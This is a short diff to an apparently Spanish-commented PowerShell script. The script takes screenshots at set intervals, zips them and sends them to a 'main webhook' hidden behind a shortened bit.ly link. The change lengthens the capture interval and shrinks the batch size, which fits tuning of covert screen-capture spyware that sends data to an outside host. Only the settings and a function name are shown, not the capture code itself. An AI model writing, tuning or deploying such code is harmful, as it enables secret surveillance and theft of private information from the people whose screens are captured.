@@ -1,7 +1,7 @@
 # URL del webhook principal
 $mainWebhookUrl = "https://bit.ly/web_chupakbras"
-$seconds = 30  # Intervalo de captura de pantalla en segundos
-$numberOfScreenshots = 20  # Cantidad de capturas de pantalla a enviar en un archivo zip
+$seconds = 60  # Intervalo de captura de pantalla en segundos
+$numberOfScreenshots = 3  # Cantidad de capturas de pantalla a enviar en un archivo zip
 
 # Función para tomar y enviar capturas de pantalla
 function TakeAndSendScreenshots {
